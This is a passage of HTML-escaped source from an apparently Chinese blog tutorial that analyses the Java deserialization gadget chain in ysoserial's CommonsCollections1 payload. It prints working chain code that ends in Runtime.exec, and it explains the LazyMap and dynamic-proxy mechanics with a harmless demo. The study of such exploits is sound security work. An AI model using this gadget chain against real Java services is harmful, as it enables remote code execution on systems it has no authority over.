&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">execArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// inert chain for setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// real chain for after setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">execArgs&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">lazyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">mapProxy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoitizedProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lazyMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoizedInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mapProxy&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// arm with actual transformer chain
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">CommonsCollections1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isApplicableJavaVersion&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">JavaVersion&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnInvHUniversalMethodImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ysoserial用的是与TransformedMap类似的LazyMap，两者的区别在于TransformedMap是在执行put操作时回调transform，而LazyMap是在get方法中执行的factory.transform，在get找不到值才会调用factory.transform去获取一个值（所谓Lazy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>LazyMap的利用比TransformedMap复杂，因为AnnotationInvocationHandler覆写的readObject中并没有直接使用Map的get，所以这里选择通过java对象代理的技术来触发它的invoke 进而到get&lt;/p>
&lt;p>我们知道对象代理可以在运行期动态创建某个&lt;code>interface&lt;/code>的实例，可以编写&lt;code>InvocationHandler&lt;/code>来实现接口的方法调用，可以做到加工和覆写（也正是叫做Proxy的原因 对接口进行Proxy 省去中间类），类似PHP魔术方法中的&lt;code>__call&lt;/code> 可以劫持对象内部的方法调用，用到java.reflect.Proxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个参数ClassLoader我们使用默认的即可，第二个是我们需要代理的对象集合，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体的代理逻辑&lt;/p>
&lt;p>比如一个覆写了invoke方法的ExampleInvocationHandler类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">compareTo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hookmethod: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hacked Object&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>作用是监控到调用的方法名是get时返回Hacked Object字符串，我们尝试外部调用它&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">App&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>回显Hook methd: get Hacked Object&lt;/p>
